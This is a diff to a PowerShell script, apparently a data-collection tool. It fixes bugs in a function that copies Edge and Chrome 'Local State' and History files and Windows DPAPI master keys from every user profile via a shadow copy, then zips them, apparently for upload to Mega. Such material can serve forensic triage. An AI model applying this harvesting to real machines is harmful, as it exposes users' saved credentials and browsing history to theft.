@@ -60,13 +60,15 @@ function Secure-Copy ($param) {
         }
     }
 
-function Browser-Copy ($usersDir, $browser) {
+
+function Browser-Copy ($usersDir, $aBrowser) {
     
-    if ($browser -eq 'Edge') { $aBrowserPath = '\Microsoft\Edge\' }
-    if ($browser -eq 'Chrome') { $aBrowserPath = '\Google\Chrome\' }
+    if ($aBrowser -eq 'Edge') { $aBrowserPath = '\Microsoft\Edge\' } 
+    elseif ($aBrowser -eq 'Chrome') { $aBrowserPath = '\Google\Chrome\' }
+    else { echo "Unknown browser"; return }
     
-    $aBrowserDestDir = ($browsersUserDestDir + $browser + '\'); New-Item $aBrowserDestDir -ItemType Directory -ea 0
-    $aBrowserUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\' + $aBrowserPath + '\User Data\')
+    $aBrowserDestDir = ($browsersUserDestDir + $aBrowser + '\'); New-Item $aBrowserDestDir -ItemType Directory -ea 0
+    $aBrowserUserDataDir = ($usersDir.FullName + '\' + '\AppData\Local\' + $aBrowserPath + '\User Data\')
     Copy-Item -Force ($aBrowserUserDataDir + '\Local State') -Destination $aBrowserDestDir
 
     foreach ($profile in (gci -Path $aBrowserUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
@@ -104,7 +106,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
     if ($destMega -eq "") { $destMega = "ZSUDocs" }
 
     if (($First -ne $true) -and ($Stream -ne $true) -and ($Browsers -ne $true) -and ($DownAll -ne $true)) {
-        echo "You must specify at least one of <First> or <Stream> or <DownAll> or <Chromedge>"
+        echo "You must specify at least one of <First> or <Stream> or <DownAll> or <Browsers>"
         return
     }
 
@@ -140,14 +142,14 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
             
             Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($browsersUserDestDir)
             attrib.exe -h -s ($browsersDestDir + '\*') /s
-            Browser-Copy ($usersDir, 'Edge')
-            Browser-Copy ($usersDir, 'Chrome')
+            Browser-Copy $usersDir 'Edge'
+            Browser-Copy $usersDir 'Chrome'
         }
 
         $volume.Delete()
         if($notrunning -eq 1) { $VSsvc.Stop() }
 
-        Compress-Archive $browsersDestDir -Destination "$destDir\$objName_Browsers_$currDateTime.zip"
+        Compress-Archive $browsersDestDir -Destination ($destDir + '\' + $objName + '_Browsers_' + $currDateTime + '.zip')
 
     }
 
